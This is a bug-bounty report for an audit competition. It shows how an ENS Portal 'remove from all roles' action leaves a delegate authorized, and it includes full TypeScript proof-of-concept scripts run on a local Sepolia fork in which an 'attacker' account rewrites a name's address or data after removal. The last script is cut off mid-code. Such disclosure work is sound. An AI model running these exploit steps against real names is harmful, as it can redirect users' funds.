# 90951 w a critical portal remove user from all roles submits incomplete revocation calldata and leaves the delegate authorized

**Submitted on Aug 28th 2026 at 11:45:04 UTC by @tinnohofficial for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90951
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

Portal constructs **Remove user from all roles** transactions from a display-oriented aggregation instead of the raw role assignments already available to the application. The aggregation loses resource boundaries and role bits. The resulting transaction can succeed while the account retains authority that Portal told the owner was removed.

The selected in-scope asset is `apps/portal`. The selected in-scope impact is C11: Portal displays complete removal but submits an incomplete or wrong-scope revocation, after which the supposedly removed delegate can redirect the name's resolution.

## Vulnerability Details

`groupRolesByAccount()` groups all resolver assignments by account. It retains raw rows internally, but the mutation path uses only the grouped `resolvedNames` and `decodedRoles` display fields:

```ts
const resolvedNames = row?.original.resolvedNames ?? [];
const roleName = resolvedNames.find((name) => name !== "(root)") ?? "";

setPendingAction({
  type: "remove",
  name: roleName,
  account: selectedAccount,
  roles: decodedRoles,
});
```

The confirmation immediately before submission asks whether the owner wants to remove the user "from all roles." Portal then emits only the call represented by the lossy `name` and `roles` fields. This fails in three independently reproduced cases:

{% stepper %}
{% step %}

### Multiple resources are collapsed

Roles on names A and B served by the same resolver become one account row. The sidebar chooses one name and sends one name-scoped revocation, leaving the assignment on the other name unchanged.
{% endstep %}

{% step %}

### Production role bits are omitted

The local `resolverRoles` map omits `ROLE_SET_DATA` at bit 36. `decodeResolverRoleBitmap()` silently drops that bit, so removal calldata reconstructed from `decodedRoles` cannot revoke it.
{% endstep %}

{% step %}

### Fine-grained resources become root

`buildResourceToNameMap()` maps only root and whole-name resources. Coin-, text-, and data-part resources resolve to no name. The sidebar converts that result to `''`, and `prepareRevokeResolverRolesTransaction()` treats `''` as root, submitting `revokeRootRoles()` against the wrong resource.
{% endstep %}
{% endstepper %}

The raw rows already available to Portal distinguish root, whole-name, and record-level resources and carry the complete role bitmap. The three PoCs create supported assignments through the same production interfaces used by Portal. The failure occurs when Portal reduces those valid rows for display and then reuses the reduced representation as mutation input.

All three transactions can return successful receipts. Portal does not compare the original raw assignments with post-transaction state before reporting completion. The original rows preserve the relevant resource and bitmap; Portal discards those fields while constructing the write.

The reproduced exploitation sequence is:

{% stepper %}
{% step %}
An owner legitimately grants an operations account resolver authority.
{% endstep %}

{% step %}
The relationship ends or the delegate becomes adversarial.
{% endstep %}

{% step %}
The owner opens the delegate's row and confirms **Remove user from all roles**.
{% endstep %}

{% step %}
Portal submits an incomplete or wrong-resource revocation and reports success.
{% endstep %}

{% step %}
The delegate uses the surviving role to change the name's ETH address or other records.
{% endstep %}
{% endstepper %}

The fix is to derive removal from every raw assignment, preserving its exact resource and raw bitmap. Unsupported bits or resource kinds must fail closed. Portal should verify that all targeted assignments are zero before reporting complete removal.

## Impact Details

The owner is shown a complete security-sensitive revocation but approves calldata that does not perform it. In the multi-name and part-resource PoCs, the supposedly removed delegate retains `ROLE_SET_ADDR` and changes a registered name's ETH address to the delegate's address. Applications and users resolving that name can then send funds to the unintended recipient.

This is C11 because Portal displays a complete revocation while constructing and submitting a different, incomplete resource and bitmap set. The incorrect transaction parameters exist before wallet approval. The retained delegate then redirects the name to an unintended recipient using the authority Portal reported as removed.

## References

* [`useResolverOverview.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/hooks/useResolverOverview.ts)
* [`resolverRoles.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts)
* [`ResolverRolesTable.tsx`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesTable.tsx)
* [`ResolverRolesSidebar.tsx`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx)
* [`revokeResolverRoles.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts)
* PoCs: `e2e/scripts/validate-resolver-role-removal.ts`, `e2e/scripts/validate-resolver-set-data-removal.ts`, and `e2e/scripts/validate-resolver-part-role-removal.ts`

## Proof of Concept

Each script imports Portal's in-scope aggregation and transaction builders, submits the resulting calldata on an isolated Sepolia fork, and verifies its effect. The fork is used only to execute the calldata produced by Portal. Start a fresh fork for each run:

```bash
anvil --fork-url "$SEPOLIA_RPC_URL" --fork-block-number 11565380 \
  --chain-id 11155111 --block-base-fee-per-gas 100000000 --port 8545
```

{% tabs %}
{% tab title="Multi-resource case" %}

```bash
ANVIL_RPC_URL=http://127.0.0.1:8545 \
  pnpm --filter @ens-apps/e2e exec tsx \
  scripts/validate-resolver-role-removal.ts
```

The script registers two names against one PermissionedResolver, grants the same delegate `ROLE_SET_ADDR` on both resources, runs Portal's aggregation and revocation builders, and submits the generated removal. The observed bitmaps changed from `[1, 1]` to `[0, 1]`. The delegate then changed the second name's address to `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`.
{% endtab %}

{% tab title="Omitted-bit case" %}

```bash
ANVIL_RPC_URL=http://127.0.0.1:8545 \
  pnpm --filter @ens-apps/e2e exec tsx \
  scripts/validate-resolver-set-data-removal.ts
```

The raw bitmap was `68719476737`, representing `ROLE_SET_ADDR | ROLE_SET_DATA`. Portal decoded only `ROLE_SET_ADDR`; after successful removal the bitmap was `68719476736`. The removed delegate then used the surviving `ROLE_SET_DATA` to store attacker-controlled ENSIP-24 data.
{% endtab %}

{% tab title="Fine-grained resource case" %}

```bash
ANVIL_RPC_URL=http://127.0.0.1:8545 \
  pnpm --filter @ens-apps/e2e exec tsx \
  scripts/validate-resolver-part-role-removal.ts
```

The delegate held `ROLE_SET_ADDR` only on the name's coin-type-60 resource. Portal resolved no name, selected the root branch, and mined a successful root revocation. The part-resource bitmap remained `1`, after which the delegate changed the registered name's ETH address.
{% endtab %}
{% endtabs %}

The scripts assert the retained bitmaps and attacker-signed post-removal writes. All three passed again on August 28, 2026.

## Complete PoC Source

The following code blocks reproduce the exact PoC files used for validation. Paths are relative to the contest repository root, and the execution commands above invoke these files without modifications to application or contract code.

### `e2e/scripts/validate-resolver-role-removal.ts`

```ts
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { computeResolverResource } from '@ensdomains/ensjs/public/v2'
import { revokeResolverRolesWriteParameters } from '@ensdomains/ensjs/wallet/v2'
import {
  permissionedRegistryGetResolverSnippet,
  permissionedResolverAuthorizeNameRolesSnippet,
  proxyDeployedEventSnippet,
  verifiableFactoryDeployProxySnippet,
} from '@ensdomains/ensjs-abi/v2'
import {
  type Address,
  createPublicClient,
  createTestClient,
  createWalletClient,
  decodeEventLog,
  encodeFunctionData,
  http,
  keccak256,
  namehash,
  parseAbi,
  stringToHex,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { packetToBytes } from 'viem/ens'
import {
  buildResourceToNameMap,
  groupRolesByAccount,
} from '../../apps/portal/src/lib/roles/resolverRoles.ts'

const rpcUrl = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const chain = {
  ...sepolia,
  rpcUrls: { default: { http: [rpcUrl] } },
} as const
const transport = http(rpcUrl)
const publicClient = createPublicClient({ chain, transport })
const testClient = createTestClient({ chain, transport, mode: 'anvil' })

const owner = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const attacker = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
)
const ownerClient = createWalletClient({ account: owner, chain, transport })
const attackerClient = createWalletClient({
  account: attacker,
  chain,
  transport,
})

const contracts = ensL1Contracts[supportedL1Chains.sepolia]
const resolverImplementation = contracts.ensPermissionedResolverImpl.address
const factory = contracts.ensVerifiableFactory.address
const registrar = contracts.ensEthRegistrar.address
const registry = contracts.ensRegistry.address
const paymentToken = contracts.usdc.address

const fullRoleBitmap = BigInt(
  '0x1111111111111111111111111111111111111111111111111111111111111111',
)
const setAddressRole = 1n
const duration = 28n * 24n * 60n * 60n

const initializeAbi = parseAbi([
  'function initialize(address admin, uint256 roleBitmap, bytes[] setters)',
])
const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
])
const tokenAbi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
])
const resolverAbi = parseAbi([
  'function roles(uint256 resource, address account) view returns (uint256)',
  'function setAddr(bytes32 node, address addr)',
  'function addr(bytes32 node) view returns (address)',
])

const wait = (hash: `0x${string}`) =>
  publicClient.waitForTransactionReceipt({ hash })

async function deployResolver(): Promise<{
  address: Address
  hash: `0x${string}`
}> {
  const initializeData = encodeFunctionData({
    abi: initializeAbi,
    functionName: 'initialize',
    args: [owner.address, fullRoleBitmap, []],
  })
  const hash = await ownerClient.writeContract({
    address: factory,
    abi: verifiableFactoryDeployProxySnippet,
    functionName: 'deployProxy',
    args: [resolverImplementation, BigInt(Date.now()), initializeData],
  })
  const receipt = await wait(hash)

  for (const log of receipt.logs) {
    try {
      const decoded = decodeEventLog({
        abi: proxyDeployedEventSnippet,
        data: log.data,
        topics: log.topics,
      })
      if (decoded.eventName === 'ProxyDeployed') {
        return { address: decoded.args.proxyAddress, hash }
      }
    } catch {
      // Ignore unrelated logs in the deployment receipt.
    }
  }
  throw new Error('ProxyDeployed event not found')
}

async function main() {
  await testClient.setCode({ address: owner.address, bytecode: '0x' })
  await testClient.setCode({ address: attacker.address, bytecode: '0x' })
  await testClient.setBalance({
    address: owner.address,
    value: 100n * 10n ** 18n,
  })
  await testClient.setBalance({
    address: attacker.address,
    value: 100n * 10n ** 18n,
  })

  const deployed = await deployResolver()
  const resolver = deployed.address
  const suffix = Date.now().toString(36)
  const labels = [`rolepoca-${suffix}`, `rolepocb-${suffix}`]
  const names = labels.map((label) => `${label}.eth`)
  const secrets = labels.map((label) =>
    keccak256(stringToHex(`secret:${label}`)),
  )

  for (let i = 0; i < labels.length; i++) {
    const commitment = await publicClient.readContract({
      address: registrar,
      abi: registrarAbi,
      functionName: 'makeCommitment',
      args: [
        labels[i],
        owner.address,
        secrets[i],
        zeroAddress,
        resolver,
        duration,
        zeroHash,
      ],
    })
    await wait(
      await ownerClient.writeContract({
        address: registrar,
        abi: registrarAbi,
        functionName: 'commit',
        args: [commitment],
      }),
    )
  }

  const minCommitmentAge = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'MIN_COMMITMENT_AGE',
  })
  await testClient.increaseTime({ seconds: Number(minCommitmentAge) + 1 })
  await testClient.mine({ blocks: 1 })

  const prices = await Promise.all(
    labels.map((label) =>
      publicClient.readContract({
        address: registrar,
        abi: registrarAbi,
        functionName: 'getRegisterPrice',
        args: [label, duration, paymentToken],
      }),
    ),
  )
  const totalPrice = prices.reduce(
    (sum, [base, premium]) => sum + base + premium,
    0n,
  )
  await wait(
    await ownerClient.writeContract({
      address: paymentToken,
      abi: tokenAbi,
      functionName: 'mint',
      args: [owner.address, totalPrice * 2n],
    }),
  )
  await wait(
    await ownerClient.writeContract({
      address: paymentToken,
      abi: tokenAbi,
      functionName: 'approve',
      args: [registrar, totalPrice * 2n],
    }),
  )

  for (let i = 0; i < labels.length; i++) {
    await wait(
      await ownerClient.writeContract({
        address: registrar,
        abi: registrarAbi,
        functionName: 'register',
        args: [
          labels[i],
          owner.address,
          secrets[i],
          zeroAddress,
          resolver,
          duration,
          paymentToken,
          zeroHash,
        ],
      }),
    )
  }

  const assignedResolvers = await Promise.all(
    labels.map((label) =>
      publicClient.readContract({
        address: registry,
        abi: permissionedRegistryGetResolverSnippet,
        functionName: 'getResolver',
        args: [label],
      }),
    ),
  )
  if (assignedResolvers.some((address) => address !== resolver)) {
    throw new Error('Names were not registered against the shared resolver')
  }

  for (const name of names) {
    await wait(
      await ownerClient.writeContract({
        address: resolver,
        abi: permissionedResolverAuthorizeNameRolesSnippet,
        functionName: 'authorizeNameRoles',
        args: [
          toHex(packetToBytes(name)),
          setAddressRole,
          attacker.address,
          true,
        ],
      }),
    )
  }

  const resources = names.map((name) =>
    computeResolverResource(namehash(name), zeroHash),
  )
  const readRoles = () =>
    Promise.all(
      resources.map((resource) =>
        publicClient.readContract({
          address: resolver,
          abi: resolverAbi,
          functionName: 'roles',
          args: [resource, attacker.address],
        }),
      ),
    )
  const before = await readRoles()

  // This is the exact aggregation and first-name selection used by the UI.
  const grouped = groupRolesByAccount(
    resources.map((resource) => ({
      account: attacker.address,
      resource: toHex(resource, { size: 32 }),
      roleBitmap: '0x1',
    })),
    buildResourceToNameMap(names.map((name) => ({ name }))),
  )
  const selectedName = grouped[0]?.resolvedNames.find(
    (name) => name !== '(root)',
  )
  if (!selectedName) throw new Error('UI did not select a name')

  const wrongRemoval = revokeResolverRolesWriteParameters(ownerClient, {
    resolverAddress: resolver,
    targetAccount: attacker.address,
    scope: 'name',
    name: selectedName,
    roles: ['ROLE_SET_ADDR'],
  })
  const removalHash = await ownerClient.writeContract(wrongRemoval)
  await wait(removalHash)

  const after = await readRoles()
  const retainedIndex = after.indexOf(setAddressRole)
  if (retainedIndex < 0) throw new Error('Expected one retained role')

  const retainedName = names[retainedIndex]
  const hijackHash = await attackerClient.writeContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'setAddr',
    args: [namehash(retainedName), attacker.address],
  })
  await wait(hijackHash)
  const resolved = await publicClient.readContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'addr',
    args: [namehash(retainedName)],
  })

  console.log(
    JSON.stringify(
      {
        resolver,
        names,
        assignedResolvers,
        groupedNames: grouped[0]?.resolvedNames,
        selectedName,
        rolesBeforeRemoval: before.map(String),
        rolesAfterRemoval: after.map(String),
        retainedName,
        resolvedAfterAttackerWrite: resolved,
        deploymentHash: deployed.hash,
        removalHash,
        hijackHash,
      },
      null,
      2,
    ),
  )
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
```

### `e2e/scripts/validate-resolver-set-data-removal.ts`

```ts
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { computeResolverResource } from '@ensdomains/ensjs/public/v2'
import { revokeResolverRolesWriteParameters } from '@ensdomains/ensjs/wallet/v2'
import {
  permissionedRegistryGetResolverSnippet,
  permissionedResolverAuthorizeNameRolesSnippet,
  proxyDeployedEventSnippet,
  verifiableFactoryDeployProxySnippet,
} from '@ensdomains/ensjs-abi/v2'
import {
  type Address,
  createPublicClient,
  createTestClient,
  createWalletClient,
  decodeEventLog,
  encodeFunctionData,
  http,
  keccak256,
  namehash,
  parseAbi,
  stringToHex,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { packetToBytes } from 'viem/ens'
import { decodeResolverRoleBitmap } from '../../apps/portal/src/lib/roles/resolverRoles.ts'

const rpcUrl = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const chain = {
  ...sepolia,
  rpcUrls: { default: { http: [rpcUrl] } },
} as const
const transport = http(rpcUrl)
const publicClient = createPublicClient({ chain, transport })
const testClient = createTestClient({ chain, transport, mode: 'anvil' })

const owner = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const attacker = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
)
const ownerClient = createWalletClient({ account: owner, chain, transport })
const attackerClient = createWalletClient({
  account: attacker,
  chain,
  transport,
})

const contracts = ensL1Contracts[supportedL1Chains.sepolia]
const resolverImplementation = contracts.ensPermissionedResolverImpl.address
const factory = contracts.ensVerifiableFactory.address
const registrar = contracts.ensEthRegistrar.address
const registry = contracts.ensRegistry.address
const paymentToken = contracts.usdc.address

const fullRoleBitmap = BigInt(
  '0x1111111111111111111111111111111111111111111111111111111111111111',
)
const setAddressRole = 1n << 0n
const setDataRole = 1n << 36n
const delegatedRoles = setAddressRole | setDataRole
const duration = 28n * 24n * 60n * 60n

const initializeAbi = parseAbi([
  'function initialize(address admin, uint256 roleBitmap, bytes[] setters)',
])
const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
])
const tokenAbi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
])
const resolverAbi = parseAbi([
  'function roles(uint256 resource, address account) view returns (uint256)',
  'function setData(bytes32 node, string key, bytes value)',
  'function data(bytes32 node, string key) view returns (bytes)',
])

const wait = (hash: `0x${string}`) =>
  publicClient.waitForTransactionReceipt({ hash })

async function deployResolver(): Promise<{
  address: Address
  hash: `0x${string}`
}> {
  const initializeData = encodeFunctionData({
    abi: initializeAbi,
    functionName: 'initialize',
    args: [owner.address, fullRoleBitmap, []],
  })
  const hash = await ownerClient.writeContract({
    address: factory,
    abi: verifiableFactoryDeployProxySnippet,
    functionName: 'deployProxy',
    args: [resolverImplementation, BigInt(Date.now()), initializeData],
  })
  const receipt = await wait(hash)

  for (const log of receipt.logs) {
    try {
      const decoded = decodeEventLog({
        abi: proxyDeployedEventSnippet,
        data: log.data,
        topics: log.topics,
      })
      if (decoded.eventName === 'ProxyDeployed') {
        return { address: decoded.args.proxyAddress, hash }
      }
    } catch {
      // Ignore unrelated logs in the deployment receipt.
    }
  }
  throw new Error('ProxyDeployed event not found')
}

async function main() {
  await testClient.setCode({ address: owner.address, bytecode: '0x' })
  await testClient.setCode({ address: attacker.address, bytecode: '0x' })
  await testClient.setBalance({
    address: owner.address,
    value: 100n * 10n ** 18n,
  })
  await testClient.setBalance({
    address: attacker.address,
    value: 100n * 10n ** 18n,
  })

  const deployed = await deployResolver()
  const resolver = deployed.address
  const label = `datapoc-${Date.now().toString(36)}`
  const name = `${label}.eth`
  const secret = keccak256(stringToHex(`secret:${label}`))

  const commitment = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'makeCommitment',
    args: [
      label,
      owner.address,
      secret,
      zeroAddress,
      resolver,
      duration,
      zeroHash,
    ],
  })
  await wait(
    await ownerClient.writeContract({
      address: registrar,
      abi: registrarAbi,
      functionName: 'commit',
      args: [commitment],
    }),
  )

  const minCommitmentAge = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'MIN_COMMITMENT_AGE',
  })
  await testClient.increaseTime({ seconds: Number(minCommitmentAge) + 1 })
  await testClient.mine({ blocks: 1 })

  const [base, premium] = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'getRegisterPrice',
    args: [label, duration, paymentToken],
  })
  const price = base + premium
  await wait(
    await ownerClient.writeContract({
      address: paymentToken,
      abi: tokenAbi,
      functionName: 'mint',
      args: [owner.address, price * 2n],
    }),
  )
  await wait(
    await ownerClient.writeContract({
      address: paymentToken,
      abi: tokenAbi,
      functionName: 'approve',
      args: [registrar, price * 2n],
    }),
  )
  await wait(
    await ownerClient.writeContract({
      address: registrar,
      abi: registrarAbi,
      functionName: 'register',
      args: [
        label,
        owner.address,
        secret,
        zeroAddress,
        resolver,
        duration,
        paymentToken,
        zeroHash,
      ],
    }),
  )

  const assignedResolver = await publicClient.readContract({
    address: registry,
    abi: permissionedRegistryGetResolverSnippet,
    functionName: 'getResolver',
    args: [label],
  })
  if (assignedResolver !== resolver) {
    throw new Error('Name was not registered against the deployed resolver')
  }

  const grantHash = await ownerClient.writeContract({
    address: resolver,
    abi: permissionedResolverAuthorizeNameRolesSnippet,
    functionName: 'authorizeNameRoles',
    args: [toHex(packetToBytes(name)), delegatedRoles, attacker.address, true],
  })
  await wait(grantHash)

  const resource = computeResolverResource(namehash(name), zeroHash)
  const readRoles = () =>
    publicClient.readContract({
      address: resolver,
      abi: resolverAbi,
      functionName: 'roles',
      args: [resource, attacker.address],
    })
  const rolesBeforeRemoval = await readRoles()

  // The Portal only decodes ROLE_SET_ADDR, then builds the removal from that
  // incomplete list even though the raw assignment supplies the full bitmap.
  const portalDecodedRoles = decodeResolverRoleBitmap(toHex(rolesBeforeRemoval))
  if (
    portalDecodedRoles.length !== 1 ||
    portalDecodedRoles[0] !== 'ROLE_SET_ADDR'
  ) {
    throw new Error(
      `Unexpected Portal decoding: ${portalDecodedRoles.join(',')}`,
    )
  }

  const incompleteRemoval = revokeResolverRolesWriteParameters(ownerClient, {
    resolverAddress: resolver,
    targetAccount: attacker.address,
    scope: 'name',
    name,
    roles: portalDecodedRoles,
  })
  const removalHash = await ownerClient.writeContract(incompleteRemoval)
  await wait(removalHash)

  const rolesAfterRemoval = await readRoles()
  if (rolesAfterRemoval !== setDataRole) {
    throw new Error(
      `Expected ROLE_SET_DATA to remain, got ${rolesAfterRemoval}`,
    )
  }

  const key = 'agent-context'
  const attackerValue = stringToHex('attacker-controlled-data')
  const mutationHash = await attackerClient.writeContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'setData',
    args: [namehash(name), key, attackerValue],
  })
  await wait(mutationHash)
  const dataAfterAttackerWrite = await publicClient.readContract({
    address: resolver,
    abi: resolverAbi,
    functionName: 'data',
    args: [namehash(name), key],
  })
  if (dataAfterAttackerWrite !== attackerValue) {
    throw new Error('Attacker data write did not persist')
  }

  console.log(
    JSON.stringify(
      {
        resolver,
        name,
        assignedResolver,
        delegatedRoleBitmap: rolesBeforeRemoval.toString(),
        portalDecodedRoles,
        rolesAfterRemoval: rolesAfterRemoval.toString(),
        dataAfterAttackerWrite,
        deploymentHash: deployed.hash,
        grantHash,
        removalHash,
        mutationHash,
      },
      null,
      2,
    ),
  )
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
```

### `e2e/scripts/validate-resolver-part-role-removal.ts`

```ts
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { addrPart, computeResolverResource } from '@ensdomains/ensjs/public/v2'
import { revokeResolverRolesWriteParameters } from '@ensdomains/ensjs/wallet/v2'
import {
  permissionedRegistryGetResolverSnippet,
  permissionedResolverAuthorizeAddrRolesSnippet,
  proxyDeployedEventSnippet,
  verifiableFactoryDeployProxySnippet,
} from '@ensdomains/ensjs-abi/v2'
import {
  type Address,
  createPublicClient,
  createTestClient,
  createWalletClient,
  decodeEventLog,
  encodeFunctionData,
  http,
  keccak256,
  namehash,
  parseAbi,
  stringToHex,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { packetToBytes } from 'viem/ens'
import {
  buildResourceToNameMap,
  groupRolesByAccount,
} from '../../apps/portal/src/lib/roles/resolverRoles.ts'

const rpcUrl = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const chain = {
  ...sepolia,
  rpcUrls: { default: { http: [rpcUrl] } },
} as const
const transport = http(rpcUrl)
const publicClient = createPublicClient({ chain, transport })
const testClient = createTestClient({ chain, transport, mode: 'anvil' })

const owner = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const attacker = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
)
const ownerClient = createWalletClient({ account: owner, chain, transport })
const attackerClient = createWalletClient({
  account: attacker,
  chain,
  transport,
})

const contracts = ensL1Contracts[supportedL1Chains.sepolia]
const resolverImplementation = contracts.ensPermissionedResolverImpl.address
const factory = contracts.ensVerifiableFactory.address
const registrar = contracts.ensEthRegistrar.address
const registry = contracts.ensRegistry.address
const paymentToken = contracts.usdc.address

const fullRoleBitmap = BigInt(
  '0x1111111111111111111111111111111111111111111111111111111111111111',
)
const setAddressRole = 1n
const ethCoinType = 60n
const duration = 28n * 24n * 60n * 60n

const initializeAbi = parseAbi([
  'function initialize(address admin, uint256 roleBitmap, bytes[] setters)',
])
const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
])
const tokenAbi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
])
const resolverAbi = parseAbi([
  'function roles(uint256 resource, address account) view returns (uint256)',
  'function setAddr(bytes32 node, address addr)',
  'function addr(bytes32 node) view returns (address)',
])

const wait = (hash: `0x${string}`) =>
  publicClient.waitForTransactionReceipt({ hash })

async function deployResolver(): Promise<{
  address: Address
  hash: `0x${string}`
}> {
  const initializeData = encodeFunctionData({
    abi: initializeAbi,
    functionName: 'initialize',
    args: [owner.address, fullRoleBitmap, []],
  })
  const hash = await ownerClient.writeContract({
    address: factory,
    abi: verifiableFactoryDeployProxySnippet,
    functionName: 'deployProxy',
    args: [resolverImplementation, BigInt(Date.now()), initializeData],
  })
  const receipt = await wait(hash)

  for (const log of receipt.logs) {
    try {
      const decoded = decodeEventLog({
        abi: proxyDeployedEventSnippet,
        data: log.data,
        topics: log.topics,
      })
      if (decoded.eventName === 'ProxyDeployed') {
        return { address: decoded.args.proxyAddress, hash }
      }
    } catch {
      // Ignore unrelated logs in the deployment receipt.
    }
  }
  throw new Error('ProxyDeployed event not found')
}

async function main() {
  await testClient.setCode({ address: owner.address, bytecode: '0x' })
  await testClient.setCode({ address: attacker.address, bytecode: '0x' })
  await testClient.setBalance({
    address: owner.address,
    value: 100n * 10n ** 18n,
  })
  await testClient.setBalance({
    address: attacker.address,
    value: 100n * 10n ** 18n,
  })

  const deployed = await deployResolver()
  const resolver = deployed.address
  const label = `partpoc-${Date.now().toString(36)}`
  const name = `${label}.eth`
  const secret = keccak256(stringToHex(`secret:${label}`))

  const commitment = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'makeCommitment',
    args: [
      label,
      owner.address,
      secret,
      zeroAddress,
      resolver,
      duration,
      zeroHash,
    ],
  })
  await wait(
    await ownerClient.writeContract({
      address: registrar,
      abi: registrarAbi,
      functionName: 'commit',
      args: [commitment],
    }),
  )

  const minCommitmentAge = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'MIN_COMMITMENT_AGE',
  })
  await testClient.increaseTime({ seconds: Number(minCommitmentAge) + 1 })
  await testClient.mine({ blocks: 1 })

  const [base, premium] = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'getRegisterPrice',
    args: [label, duration, paymentToken],
  })
  const price = base + premium
  await wait(
    await ownerClient.writeContract({
      address: paymentToken,
      abi: tokenAbi,
      functionName: 'mint',
      args: [owner.address, price * 2n],
    }),
  )
  await wait(
    await ownerClient.writeContract({
      address: paymentToken,
      abi: tokenAbi,
      functionName: 'approve',
      args: [registrar, price * 2n],
    }),
  )
  await wait(
    await ownerClient.writeContract({
      address: registrar,
      abi: registrarAbi,
      functionName: 'register',
      args: [
        label,
        owner.address,
        secret,
        zeroAddress,
        resolver,
        duration,
        paymentToken,
        zeroHash,
      ],
    }),
  )

  const assignedResolver = await publicClient.readContract({
    address: registry,
    abi: permissionedRegistryGetResolverSnippet,
    functionName: 'getResolver',
    args: [label],
  })
  if (assignedResolver !== resolver) {
    throw new Error('Name was not registered against the deployed resolver')
  }

  const grantHash = await ownerClient.writeContract({
    address: resolver,
    abi: permissionedResolverAuthorizeAddrRolesSnippet,
    functionName: 'authorizeAddrRoles',
    args: [toHex(packetToBytes(name)), ethCoinType, attacker.address, true],
  })
  await wait(grantHash)

  const partResource = computeResolverResource(
    namehash(name),
    addrPart(ethCoinType),
  )
  const readPartRoles = () =>
    publicClient.readContract({
      address: resolver,
      abi: resolverAbi,
      functionName: 'roles',
      args: [partResource, attacker.address],
    })
  const rolesBeforeRemoval = await readPartRoles()

  // The Portal only maps resource(namehash, 0). This legitimate address-part
  // resource is unresolved, so the sidebar falls back to an empty name/root.
  const grouped = groupRolesByAccount(
    [
      {
        account: attacker.address,
